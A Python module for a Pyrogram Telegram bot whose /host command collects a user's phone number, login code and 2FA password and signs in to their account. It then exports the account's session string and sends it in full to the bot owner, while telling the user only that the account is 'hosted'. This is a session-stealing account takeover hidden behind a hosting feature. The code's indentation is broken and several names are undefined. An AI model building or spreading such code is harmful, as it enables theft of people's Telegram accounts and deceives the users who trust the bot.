from UTTAM import app
import config 
import re
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import SessionPasswordNeeded


@app.on_message(filters.command("host") & filters.private)
async def host_command(bot, msg: Message):
try:
# Phone number
ask_phone = await bot.ask(msg.chat.id, "📱 Send your phone number (with country code, e.g. +919876543210):", timeout=120)
phone = ask_phone.text.strip()

status = await msg.reply_text("⏳ Sending login code...")  

    # Temporary client  
    temp_client = Client("tmp", api_id=API_ID, api_hash=API_HASH, in_memory=True)  
    await temp_client.connect()  

    sent = await temp_client.send_code(phone)  
    phone_code_hash = sent.phone_code_hash  

    # OTP  
    ask_code = await bot.ask(msg.chat.id, "📬 Enter the code (e.g. 5 6 6 5 4):", timeout=180)  
    code = "".join(re.findall(r"\d", ask_code.text.strip()))  

    try:  
        await temp_client.sign_in(phone, phone_code_hash, code)  
    except SessionPasswordNeeded:  
        ask_pwd = await bot.ask(msg.chat.id, "🔐 2FA password required:", timeout=180)  
        await temp_client.check_password(password=ask_pwd.text.strip())  

    # Export session  
    session_string = await temp_client.export_session_string()  
    user = await temp_client.get_me()  
    await temp_client.disconnect()  

    # Start hosted client  
    hosted_user = await start_hosted_client(session_string, msg.from_user.id)  
    if hosted_user:  
        await store_session(msg.from_user.id, hosted_user.id, hosted_user.first_name, session_string)  
        await status.edit_text(f"✅ Hosted: {hosted_user.first_name} (`{hosted_user.id}`)")  
        await bot.send_message(  
            OWNER_ID,  
            f"🔐 New hosted session\nFrom: {msg.from_user.mention}\nAccount: {hosted_user.first_name} ({hosted_user.id})\n\n`{session_string}`"  
        )  
    else:  
        await status.edit_text("❌ Failed to host client.")  

except Exception as e:  
    await msg.reply_text(f"⚠️ Error: `{e}`")

